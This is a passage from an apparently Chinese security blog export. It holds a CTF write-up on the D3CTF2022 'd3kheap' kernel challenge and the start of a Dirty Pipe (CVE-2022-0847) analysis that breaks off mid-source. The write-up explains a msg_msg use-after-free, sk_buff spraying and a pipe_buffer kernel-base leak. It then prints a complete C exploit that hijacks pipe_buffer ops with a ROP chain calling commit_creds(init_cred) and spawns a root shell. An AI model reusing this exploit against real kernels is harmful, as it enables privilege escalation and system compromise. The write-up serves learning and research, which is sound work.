0。\n这里利用这一漏洞的方法是，首先我们需要在msg_queue中存放两个msg_msg，分为一个主消息(0x1000)和一个辅助消息(0x400)。利用两个字节的溢出覆盖掉其中某一个主消息msg_msg-&gt;m_list-&gt;next指针，使两个msg_msg主消息指向同一个辅助消息，进而转化为UAF漏洞。后续的利用会在d3kheap题目提到这里就不再赘述了。\n利用分析因为我们这里相较于原本的CVE中可以更为简单的形成uaf，所以我们只需要考虑如何使用结构体即可。我们顺理成章的选择与原CVE相同的msg_msg建立主从消息队列\n\n为了方便后续的利用我们主从消息堆块的size分别选择96和1024。\n此时我们可以利用d3kheap的功能造成UAF，但是我们仍然可以通过其中一个消息队列访问这个已经进入freelist的msg_msg，所以现在我们需要定位这一个msg_queue\n定位msg_queue\n这里是目前内存中主从形式，这里我们使用sk_buff堆喷来定位这个free了的msg_msg结构体，该结构体类似于 msg_msg，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 msg_msg 由一个 header 加上用户数据组成，而 sk_buff 本身不包含任何用户数据，用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针，并且存放用户数据的object只有0x140存放着一些指针，所以在这道题目里我们进行堆喷时write的大小为0x2c0。\n\n至于这个结构体的分配与释放也是十分简单，sk_buff 在内核网络协议栈中代表一个「包」，我们不难想到的是我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作。\n根据前一篇的思路，我们使用msgrcv时还是会使用MSG_COPY标识位。但是我们到底如何判断呢？\n// ...  if (!IS_ERR(msg)) &#123;    /*         * Found a suitable message.         * Unlink it from the queue.         */    if ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;      msg = ERR_PTR(-E2BIG);      goto out_unlock0;    &#125;    /*         * If we are copying, then do not unlink message and do         * not update queue parameters.         */    if (msgflg &amp; MSG_COPY) &#123;      msg = copy_msg(msg, copy);      goto out_unlock0;    &#125;    list_del(&amp;msg-&gt;m_list);    msq-&gt;q_qnum--;    msq-&gt;q_rtime = ktime_get_real_seconds();    ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));    msq-&gt;q_cbytes -= msg-&gt;m_ts;    atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);    atomic_dec(&amp;ns-&gt;msg_hdrs);    ss_wakeup(msq, &amp;wake_q, false);    goto out_unlock0;  &#125;// ...out_unlock0:  ipc_unlock_object(&amp;msq-&gt;q_perm);  wake_up_q(&amp;wake_q);out_unlock1:\trcu_read_unlock();\tif (IS_ERR(msg)) &#123;\t\tfree_copy(copy);\t\treturn PTR_ERR(msg);\t&#125;\n\n可以看到这里如果我们传入的bufsz小于msg-&gt;m_ts就会给msg赋值一个负值，然后在后面return出来。不过这里在使用msgrcv函数时需要注意的还有msgtyp这个参数。\nstatic struct msg_msg *find_msg(struct msg_queue *msq, long *msgtyp, int mode)&#123;\tstruct msg_msg *msg, *found = NULL;\tlong count = 0;\tlist_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;\t\tif (testmsg(msg, *msgtyp, mode) &amp;&amp;\t\t    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,\t\t\t\t\t       *msgtyp, mode)) &#123;\t\t\tif (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != 1) &#123;\t\t\t\t*msgtyp = msg-&gt;m_type - 1;\t\t\t\tfound = msg;\t\t\t&#125; else if (mode == SEARCH_NUMBER) &#123;\t\t\t\tif (*msgtyp == count)\t\t\t\t\treturn msg;\t\t\t&#125; else\t\t\t\treturn msg;\t\t\tcount++;\t\t&#125;\t&#125;\treturn found ?: ERR_PTR(-EAGAIN);&#125;\n\n通过阅读其他源码可以看到mode是等于SEARCH_NUMBER的，所以这里会判断msgtyp和count的值，如果我们仍然想上一篇文章那样传入0，就只会读取msg_queue中的第一个msg_msg也就是我们的主消息，不过我们真正需要的辅助消息，所以这里我们还需要把传入的msgtyp修改为1才能获取到我们的目标object。\n所以我们可以控制msg-&gt;m_ts然后控制传入的msgtyp以及bufsz就可以出现报错，不过这里仍然不会出现kernel panic，所以我们可以此种办法定位哪一个meg_queue中的辅助消息为我们的UAF的msg_msg。\n泄漏堆地址这里泄漏堆地址的方式其实跟上一篇文章一致的，首先通过越界读取相邻辅助消息堆块的指针，并且此时的辅助消息msg_msg-&gt;m_list.next指向的是msg_queue而msg_msg-&gt;m_list.prev指向的是主消息的地址。一样的主消息msg-&gt;m_list.next指向的是辅助堆块，那么对我们来说就可以通过两次读取泄漏出我们UAF堆块的地址。\n\n不过这里的前提是和上一篇文章一样那就是存在相邻的辅助堆块也就是堆块分配在同一页内存上。\n泄漏基地址这里泄漏基地址的方法和前面的方法就完全不一样了，这里使用pipe_buffer来泄漏。\n/** *\tstruct pipe_buffer - a linux kernel pipe buffer *\t@page: the page containing the data for the pipe buffer *\t@offset: offset of data inside the @page *\t@len: length of data inside the @page *\t@ops: operations associated with this buffer. See @pipe_buf_operations. *\t@flags: pipe buffer flags. See above. *\t@private: private data owned by the ops. **/struct pipe_buffer &#123;\tstruct page *page;\tunsigned int offset, len;\tconst struct pipe_buf_operations *ops;\tunsigned int flags;\tunsigned long private;&#125;;\n\n在 pipe_buffer 中存在一个函数表成员 pipe_buf_operations ，其指向内核中的函数表 anon_pipe_buf_ops，若我们能够将其读出，便能泄露出内核基址。\n这里使用的方法是，使sk_buff指向这个UAF的堆块，并且他已经是free的状态，接着堆喷pipe_buffer，最后读出数据继续维持UAF状态。\n劫持执行流在上一步我们已经泄漏出基地址，并且此时pipe_buffer所指向的堆块还是free状态，所以我们可以继续利用sk_buff进行堆喷。最后修改ops指针指向我们上面泄漏出来的堆地址，最后跟上一篇文章一样进行ROP即可。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;#define MSG_COPY 040000#define MSG_TAG 0xAAAAAAAA#define PRIMARY_MSG_TYPE 0x41#define SECONDARY_MSG_TYPE 0x42#define MSG_QUEUE_NUM 4096#define PRIMARY_MSG_SIZE 96#define SECONDARY_MSG_SIZE 0x400#define VICTIM_MSG_TYPE 0x1337#define SOCKET_NUM 32#define SK_BUFF_NUM 128#define PIPE_NUM 256#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede#define INIT_CRED 0xffffffff82c6d580#define COMMIT_CREDS 0xffffffff810d25c0#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0#define POP_RDI_RET 0xffffffff810938f0void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;struct list_head&#123;    struct list_head *next, *prev;&#125;;struct msg_msgseg&#123;    uint64_t next;&#125;;struct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;struct pipe_buffer&#123;    uint64_t page;    uint32_t offset, len;    uint64_t ops;    uint32_t flags;    uint32_t padding;    uint64_t private;&#125;;struct pipe_buf_operations&#123;    uint64_t confirm;    uint64_t release;    uint64_t try_steal;    uint64_t get;&#125;;struct&#123;    long mtype;    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];&#125; oob_msg;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;struct&#123;    long mtype;    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; primary_msg;struct&#123;    long mtype;    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; secondary_msg;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void getShell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;int fd;void add()&#123;    ioctl(fd, 0x1234);&#125;void del()&#123;    ioctl(fd, 0xDEAD);&#125;int main()&#123;    save_status();    char *buf = malloc(0x4000);    unsigned long *point_buf = malloc(0x4000);    int victim_qid = -1;    int sk_sockets[SOCKET_NUM][2];    int msqid[MSG_QUEUE_NUM];    char fake_secondary_msg[704];    struct msg_msg *nearby_msg;    struct msg_msg *nearby_msg_prim;    unsigned long victim_addr;    unsigned long search_addr;    unsigned long kernel_addr;    unsigned long kernel_base;    unsigned long kernel_offset;    struct pipe_buffer *pipe_buf_ptr;    int pipe_fd[PIPE_NUM][2];    struct pipe_buf_operations *ops_ptr;    unsigned long *rop_chain;    for (int i = 0; i &lt; SOCKET_NUM; i++)        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) &lt; 0)            errExit(&quot;failed to create socket pair!&quot;);    fd = open(&quot;/dev/d3kheap&quot;, O_RDONLY);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open d3kheap error!&quot;);        exit(0);    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) &lt; 0)            errExit(&quot;failed to create msg_queue!&quot;);    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] spray msg_msg, construct overlapping object\\033[0m&quot;);    memset(&amp;primary_msg, 0, sizeof(primary_msg));    memset(&amp;secondary_msg, 0, sizeof(secondary_msg));    *(long *)&amp;primary_msg = PRIMARY_MSG_TYPE;    *(long *)&amp;secondary_msg = SECONDARY_MSG_TYPE;    *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;    *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;    add();    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;primary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;primary_msg,                   sizeof(primary_msg) - 8, 0) &lt; 0)            errExit(&quot;failed to send primary msg!&quot;);        *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;secondary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;secondary_msg,                   sizeof(secondary_msg) - 8, 0) &lt; 0)            errExit(&quot;failed to send secondary msg!&quot;);        if (i == 1024)            del();    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] construct UAF\\033[0m&quot;);    del();    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 0x1000 - sizeof(struct msg_msg);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if (msgrcv(msqid[i], &amp;secondary_msg, sizeof(secondary_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)        &#123;            printf(&quot;[+] victim qid: %d\\n&quot;, i);            victim_qid = i;        &#125;    &#125;    if (victim_qid == -1)        errExit(&quot;failed to make the UAF in msg queue!&quot;);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;\\033[32m\\033[1m[+] UAF construction complete!\\033[0m&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] spray sk_buff to leak kheap addr\\033[0m&quot;);    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 0x1000 - sizeof(struct msg_msg);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    if (*(int *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)        errExit(&quot;failed to rehit the UAF object!&quot;);    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - sizeof(struct msg_msg))];    printf(&quot;\\033[32m\\033[1m[+] addr of primary msg of msg nearby victim: \\033[0m%p\\n&quot;,           nearby_msg-&gt;m_list.prev);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    search_addr = (unsigned long *)nearby_msg-&gt;m_list.prev;    search_addr = search_addr - 8;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = sizeof(oob_msg.mtext);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg), 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    // print_hex(oob_msg.mtext, sizeof(oob_msg.mtext));    if (*(int *)&amp;oob_msg.mtext[0x1000] != MSG_TAG)        errExit(&quot;failed to rehit the UAF object!&quot;);    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];    victim_addr = (unsigned long *)(nearby_msg_prim-&gt;m_list.next);    victim_addr = victim_addr - 0x400;    printf(&quot;\\033[32m\\033[1m[+] addr of msg next to victim: \\033[0m%p\\n&quot;,           nearby_msg_prim-&gt;m_list.next);    printf(&quot;\\033[32m\\033[1m[+] addr of msg UAF object: \\033[0m%p\\n&quot;, victim_addr);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] spray pipe_buffer to leak kernel base\\033[0m&quot;);    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + 0x800;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + 0x800;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 1024 - 0x30;    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;secondary_msg, sizeof(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        if (pipe(pipe_fd[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        if (write(pipe_fd[i][1], &quot;196082&quot;, 6) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], &amp;fake_secondary_msg,                     sizeof(fake_secondary_msg)) &lt; 0)                errExit(&quot;failed to release sk_buff!&quot;);            if (pipe_buf_ptr-&gt;ops &gt; 0xffffffff81000000)            &#123;                printf(&quot;\\033[32m\\033[1m[+] got pipe_buf_ops: \\033[0m%p\\n&quot;,                       pipe_buf_ptr-&gt;ops);                kernel_addr = (unsigned long *)(pipe_buf_ptr-&gt;ops);                kernel_offset = (kernel_addr - 0xffffffff8203fe40);                kernel_base = 0xffffffff81000000 + kernel_offset;            &#125;        &#125;    &#125;    printf(&quot;\\033[32m\\033[1m[+] kernel base: \\033[0m%p \\033[32m\\033[1moffset: \\033[0m%p\\n&quot;,           kernel_base, kernel_addr);    puts(&quot;\\n\\033[34m\\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\\033[0m&quot;);    unsigned long pop_rdi = 0xffffffff810938f0 + kernel_offset;    unsigned long init_cred = 0xffffffff82c6d580 + kernel_offset;    unsigned long commit_cred = 0xffffffff810d25c0 + kernel_offset;    unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00ff0 + kernel_offset;    unsigned long push_rsi_pop_rsp_pop_4reg_ret = 0xffffffff812dbede + kernel_offset;    pipe_buf_ptr-&gt;page = *(uint64_t *)&quot;196082&quot;;    pipe_buf_ptr-&gt;ops = victim_addr + 0x100;    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[0x100];    ops_ptr-&gt;release = push_rsi_pop_rsp_pop_4reg_ret;    int rop = 0;    rop_chain = (uint64_t *)&amp;fake_secondary_msg[0x20];    rop_chain[rop++] = pop_rdi;    rop_chain[rop++] = init_cred;    rop_chain[rop++] = commit_cred;    rop_chain[rop++] = swapgs_restore_regs_and_return_to_usermode + 0x16;    rop_chain[rop++] = 0;    rop_chain[rop++] = 0;    rop_chain[rop++] = getShell;    rop_chain[rop++] = user_cs;    rop_chain[rop++] = user_rflags;    rop_chain[rop++] = user_sp;    rop_chain[rop++] = user_ss;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        close(pipe_fd[i][0]);        close(pipe_fd[i][1]);    &#125;    return 0;&#125;\n\n\n\n参考链接：https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-IV-%E5%A0%86%E5%96%B7-pipe-buffer%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80\n题目在上一篇文章\n","categories":["kernel-pwn","CVE"],"tags":["msg_msg","sk_buff","pipe_buffer"]},{"title":"CVE-2022-0847 Dirty Pipe","url":"/2022/11/22/CVE-2022-0847-Dirty-Pipe/","content":"前言持续性摆烂一段时间了，又想看jyy的课，又要期末考试了，好烦！索性花点时间把Gyan神上半年叫我复现的CVE复现了。\n这个CVE允许向任意可读文件中写数据，可造成非特权进程向root进程注入代码。该漏洞发生linux内核空间通过splice方式实现数据拷贝时，以”零拷贝”的形式将文件发送到pipe，并且没有初始化pipe缓存页管理数据结构的flag成员。\n零拷贝首先需要了解一下零拷贝的概念，在普通的文件传输过程是如下图所示，可以看到这里进行了四次上下文切换，导致不必要的浪费和开销\n\n所以linux内核出现了解决办法就是可以快速高效地将数据从文件系统移动到网络接口，而不需要将其从内核空间复制到用户空间，而这也就是所谓的零拷贝，在linux内核中有splice方式来解决。\n这个系统调用不仅支持网络层面的传输，如果用户拥有两个已经打开的文件描述符可以任意文件相互连接，而不仅限于socket。\npipe原理pipe在前面的利用中也使用到过，不过大多是利用它申请的结构体的堆块劫持ops或者泄漏，这里主要是使用他初始化会带来的内容。\n首先我们清楚pipe会创建两个文件描述符，一个是输入另一个输出。在内核中pipe缓冲区的总长度是65536字节，一共16页，这里页与页之间不连续是通过数组进行管理的，维护的是一个类似于链表的结构。以前就提到过，pipe在内核中是下图这样的表现形式：\n\n有pipe_buffer结构体只想page，而pipe_buffer结构体在往期kernel中有详细介绍，这里就不再赘述了。\nstatic ssize_tpipe_write(struct kiocb *iocb, struct iov_iter *from)&#123;\tstruct file *filp = iocb-&gt;ki_filp;\tstruct pipe_inode_info *pipe = filp-&gt;private_data;\tunsigned int head;\tssize_t ret = 0;\tsize_t total_len = iov_iter_count(from);\tssize_t chars;\tbool was_empty = false;\tbool wake_next_writer = false;\t/* Null write succeeds. */\tif (unlikely(total_len == 0))\t\treturn 0;\t__pipe_lock(pipe);\tif (!pipe-&gt;readers) &#123;\t\tsend_sig(SIGPIPE, current, 0);\t\tret = -EPIPE;\t\tgoto out;\t&#125;#ifdef CONFIG_WATCH_QUEUE\tif (pipe-&gt;watch_queue) &#123;\t\tret = -EXDEV;\t\tgoto out;\t&#125;#endif\t/*\t * Only wake up if the pipe started out empty, since\t * otherwise there should be no readers waiting.\t *\t * If it wasn&#x27;t empty we try to merge new data into\t * the last buffer.\t *\t * That naturally merges small writes, but it also\t * page-aligs the rest of the writes for large writes\t * spanning multiple pages.\t */\thead = pipe-&gt;head;\twas_empty = pipe_empty(head, pipe-&gt;tail);\tchars = total_len &amp; (PAGE_SIZE-1);\tif (chars &amp;&amp; !was_empty) &#123;\t\tunsigned int mask = pipe-&gt;ring_size - 1;\t\tstruct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];\t\tint offset = buf-&gt;offset + buf-&gt;len;\t\tif ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;\t\t    offset + chars &lt;= PAGE_SIZE) &#123;\t\t\tret = pipe_buf_confirm(pipe, buf);\t\t\tif (ret)\t\t\t\tgoto out;\t\t\tret = copy_page_from_iter(buf-&gt;page, offset, chars, from);\t\t\tif (unlikely(ret &lt; chars)) &#123;\t\t\t\tret = -EFAULT;\t\t\t\tgoto out;\t\t\t&#125;\t\t\tbuf-&gt;len += ret;\t\t\tif (!iov_iter_count(from))\t\t\t\tgoto out;\t\t&#125;\t&#125;\tfor (;;) &#123;\t\tif (!pipe-&gt;readers) &#123;\t\t\tsend_sig(SIGPIPE, current, 0);\t\t\tif (!ret)\t\t\t\tret = -EPIPE;\t\t\tbreak;\t\t&#125;\t\thead = pipe-&gt;head;\t\tif (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;\t\t\tunsigned int mask = pipe-&gt;ring_size - 1;\t\t\tstruct pipe_buffer *buf = &amp;pipe-&gt;bufs[head &amp; mask];\t\t\tstruct page *page = pipe-&gt;tmp_page;\t\t\tint copied;\t\t\tif (!page) &#123;\t\t\t\tpage = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);\t\t\t\tif (unlikely(!page)) &#123;\t\t\t\t\tret = ret ? : -ENOMEM;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t\tpipe-&gt;tmp_page = page;\t\t\t&#125;\t\t\t/* Allocate a slot in the ring in advance and attach an\t\t\t * empty buffer.  If we fault or otherwise fail to use\t\t\t * it, either the reader will consume it or it&#x27;ll still\t\t\t * be there for the next write.\t\t\t */\t\t\tspin_lock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\thead = pipe-&gt;head;\t\t\tif (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;\t\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\t\tcontinue;\t\t\t&#125;\t\t\tpipe-&gt;head = head + 1;\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\t/* Insert it into the buffer array */\t\t\tbuf = &amp;pipe-&gt;bufs[head &amp; mask];\t\t\tbuf-&gt;page = page;\t\t\tbuf-&gt;ops = &amp;anon_pipe_buf_ops;\t\t\tbuf-&gt;offset = 0;\t\t\tbuf-&gt;len = 0;\t\t\tif (is_packetized(filp))\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_PACKET;\t\t\telse\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;\t\t\tpipe-&gt;tmp_page = NULL;\t\t\tcopied = copy_page_from_iter(page, 0, PAGE_SIZE, from);\t\t\tif (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;\t\t\t\tif (!ret)\t\t\t\t\tret = -EFAULT;\t\t\t\tbreak;\t\t\t&#125;\t\t\tret += copied;\t\t\tbuf-&gt;offset = 0;\t\t\tbuf-&gt;len = copied;\t\t\tif (!iov_iter_count(from))\t\t\t\tbreak;\t\t&#125;\t\tif (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))\t\t\tcontinue;\t\t/* Wait for buffer space to become available. */\t\tif (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;\t\t\tif (!ret)\t\t\t\tret = -EAGAIN;\t\t\tbreak;\t\t&#125;\t\tif (signal_pending(current)) &#123;\t\t\tif (!ret)\t\t\t\tret = -ERESTARTSYS;\t\t\tbreak;\t\t&#125;\t\t/*\t\t * We&#x27;re going to release the pipe lock and wait for more\t\t * space. We wake up any readers if necessary, and then\t\t * after waiting we need to re-check whether the pipe\t\t * become empty while we dropped the lock.\t\t */\t\t__pipe_unlock(pipe);\t\tif (was_empty) &#123;\t\t\twake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);\t\t\tkill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);\t\t&#125;\t\twait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));\t\t__pipe_lock(pipe);\t\twas_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);\t\twake_next_writer = true;\t&#125;out:\t......&#125;\n\n可以看到在上半部分的会验证待输入的内容和当前页内已输入的内容长度是否超过PAGE_SIZE，然后验证buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE如果通过则会进行copy操作。\n如果未通过上半部分的验证则不会进入out，则会进入下方的for循环内，下面会新生成一个page，并且初始化buf\n注意：这里默认的buf-&gt;flag = PIPE_BUF_FLAG_CAN_MERGE\n漏洞分析linux 内核page cache机制linux 通过将打开的文件放到缓存页之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。而我们通过该方法篡改了这个文件缓存页，则短时间内访问(读取)该文件的操作都会读到被我们篡改的文件缓存页上，完成利用。\n漏洞原理splice 的零拷贝方法就是，直接用文件缓存页来替换pipe 中的缓存页(更改pipe缓存页指针指向文件缓存页)\n这里漏洞出现在:\nstatic size_t copy_page_to_iter_pipe(struct page 